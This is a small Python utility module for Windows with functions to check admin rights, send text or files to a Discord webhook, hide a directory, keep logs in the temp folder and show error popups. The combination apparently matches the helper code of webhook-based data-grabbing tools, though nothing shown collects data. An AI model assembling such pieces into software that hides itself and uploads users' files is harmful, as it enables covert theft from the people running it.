import os
import ctypes
import sys
import requests
import tempfile

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


# send embeds to discord webhook
def send_webhook(url, content=None, file=None):
    if not url:
        print("ERROR: ATTEMPTED TO SEND WEBHOOK WITHOUT URL")
        return
    if file:
        requests.post(url, files=file)
    else:
        requests.post(url, json={"content": content})

def is_exe():
    return getattr(sys, "frozen", False)

def get_logs_path(software_dir_name):
    return os.path.join(tempfile.gettempdir(), software_dir_name)

def display_error_message(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)


def hide_dir(path):
    ctypes.windll.kernel32.SetFileAttributesW(path, 2)
